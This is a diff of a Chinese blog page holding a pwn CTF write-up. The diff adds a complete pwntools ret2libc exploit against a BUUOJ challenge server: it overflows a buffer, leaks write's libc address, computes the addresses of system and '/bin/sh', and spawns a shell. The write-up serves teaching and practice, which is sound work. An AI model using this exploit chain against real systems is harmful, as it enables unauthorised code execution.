@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://www.ghostfoxy.cn/banner/2.png">
 <meta property="article:published_time" content="2025-11-14T11:17:04.000Z">
-<meta property="article:modified_time" content="2025-11-23T03:22:09.988Z">
+<meta property="article:modified_time" content="2025-11-24T09:29:52.637Z">
 <meta property="article:author" content="Gh0stF0xy">
 <meta property="article:tag" content="pwn 题解 write-ups">
 <meta name="twitter:card" content="summary_large_image">
@@ -230,7 +230,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.8k 字
+          7k 字
         
       </span>
     
@@ -241,7 +241,7 @@
         
         
         
-          57 分钟
+          58 分钟
         
       </span>
     
@@ -292,7 +292,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2025-11-23T11:22:09+08:00
+                    本文最后更新于 2025-11-24T17:29:52+08:00
                   
                   
 
@@ -757,8 +757,12 @@
 <p>题目已经告诉我们了，libc文件版本是libc-2.23.so</p>
 <p>尝试泄漏write的地址</p>
 <p>偏移量为0xe7 + 0x4</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload2 = offset * <span class="hljs-string">b&#x27;a&#x27;</span> + <br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload2 = offset * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(write_plt_addr) + p32(<span class="hljs-number">0</span>) + p32(write_got_addr) + p32(<span class="hljs-number">0x8</span>)<br></code></pre></td></tr></table></figure>
 
+<p>初步exp编写：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26648</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>write_plt_addr = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got_addr = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = <span class="hljs-number">0x08048825</span><br>offset = <span class="hljs-number">0xe7</span> + <span class="hljs-number">0x4</span><br>payload1 = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;\xFF&#x27;</span><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * offset + p32(write_plt_addr) + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got_addr) + p32(<span class="hljs-number">0x8</span>) <span class="hljs-comment">#32位程序的函数调用时，函数地址后面应该是函数结束后的返回地址</span><br>p.sendline(payload1)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Correct\n&#x27;</span>,payload2)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br>libc_base = write_addr - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>p.sendline(payload1)<br>exit_addr = <span class="hljs-number">0x08048558</span><br>payload3 = <span class="hljs-string">b&#x27;a&#x27;</span> * offset + p32(system_addr) + p32(exit_addr) + p32(binsh_addr)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Correct\n&#x27;</span>,payload3)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>执行程序拿到shell</p>
 
                 
               </div>
@@ -837,7 +841,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2025年11月23日</div>
+          <div>2025年11月24日</div>
         </div>
       
       
